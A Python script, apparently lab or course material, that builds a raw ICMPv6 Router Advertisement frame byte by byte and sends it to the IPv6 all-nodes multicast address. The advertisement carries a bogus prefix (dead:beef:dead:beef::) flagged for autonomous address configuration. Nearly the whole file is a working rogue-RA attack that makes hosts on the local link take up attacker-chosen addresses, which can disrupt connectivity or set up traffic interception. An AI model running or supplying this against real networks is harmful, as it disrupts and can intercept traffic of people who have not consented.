#!/usr/bin/python3.7
import binascii
import socket
import struct
import cno_net_helper as cno  # cno_net_helper.py should be the same folder


# FOR LINUX - comment out the Windows line below
dev = "eno1"  # Device to send packet out
# FOR WINDOWS - comment out the Linux line above
#dev = "Intel(R) Ethernet Connection (5) I219-LM"  # Device to send packet out


# Destination options:

# Send to Multicast Link Local Router
dst_mac = cno.mac_str_to_bin("33:33:00:00:00:01") # Target MAC (multicast)
dst_ipv6 = cno.ipv6_str_to_bin("ff02::1")  	  # Target IPv6 address: all nodes

# Source
src_mac = cno.mac_str_to_bin("a4:bb:6d:e1:8c:80") 	  # Host MAC
src_ipv6 = cno.ipv6_str_to_bin("fe80::7cbb:a056:dfd0:f33f")  # Host IPv6 address

# Bad Prefix
bad_ipv6_prefix = cno.ipv6_str_to_bin("dead:beef:dead:beef::")


# ICMPv6 and ICMPv6 Options
icmpv6_hdr = b"\x86"             	# Type: 134 (Router Advertisement)
icmpv6_hdr += b"\x00"             	# Code: 0
icmpv6_hdr += b"\x00" * 2         	# Checksum
icmpv6_hdr += b"\x40"             	# Current Hop Limit: 64
icmpv6_hdr += b"\x00"             	# Flags: No flags set
icmpv6_hdr += b"\x00\x78"         	# Router Lifetime: 120
icmpv6_hdr += b"\x00\x00\x00\x78"	# Reachable Time: 120
icmpv6_hdr += b"\x00\x00\x00\x00"  	# Retrans Time: 0

# Prefix Information option
icmpv6_option = b"\x03"  		# Type: 3 (Prefix information)
icmpv6_option += b"\x04"  		# Len: 4 (32 Bytes)
icmpv6_option += b"\x40"  		# Prefix Length: 64
icmpv6_option += b"\xc0"  		# Flags Set to ON:
					#	- on-link flags
					# 	- autonomous configuration
icmpv6_option += b"\x00\x00\x00\x78"  	# Valid Lifetime: 120
icmpv6_option += b"\x00\x00\x00\x78"  	# Preferred Lifetime (4 bytes)
icmpv6_option += b"\x00\x00\x00\x00"  	# Reserved (4 bytes)
icmpv6_option += bad_ipv6_prefix      	# Prefix: dead:beef:dead:beef::

# Source Link-Layer address
icmpv6_option += b"\x01"  		# Type: 1 (Source Link-Layer address)
icmpv6_option += b"\x01"  		# Len: 1 (8 Bytes)
icmpv6_option += src_mac  		# Link Layer Address: Source MAC

# Calculate ICMPv6 length
icmpv6_hdr += icmpv6_option
icmpv6_hdr_len = struct.pack('>H', len(icmpv6_hdr))


# IPv6
ipv6_hdr = b"\x60\x00\x00\x00"  # Version (4 bit): 6 (0x6)
# Traffic class (8 bit): 0 (0x00)
# Flow label (20 bit): 0  (0x00000)
# Payload len (2 bytes): ICMPv6 header + ICMPv6 options
ipv6_hdr += icmpv6_hdr_len
ipv6_hdr += b"\x3a"             # Next header: 58 (ICMPv6)
ipv6_hdr += b"\xff"             # Max hop limit: 255
ipv6_hdr += src_ipv6            # Source IPv6 adresses
ipv6_hdr += dst_ipv6            # Destination IPv6 multicast address


# Ethernet
eth_hdr = dst_mac      		# Destination MAC : IPv6 multicast MAC
eth_hdr += src_mac      	# Source MAC
eth_hdr += struct.pack(">H", cno.ETH_TYPES['IPv6'])  # Type: IPv6


# Contruct Ethernet frame
eth_frame = eth_hdr + ipv6_hdr + icmpv6_hdr

# Send the packet with checksum
cno.rawsend_cksum_ipv6(eth_frame, dev)
#cno.rawsend_ipv6(eth_frame, dev) # use instead if the checksum is creating issues
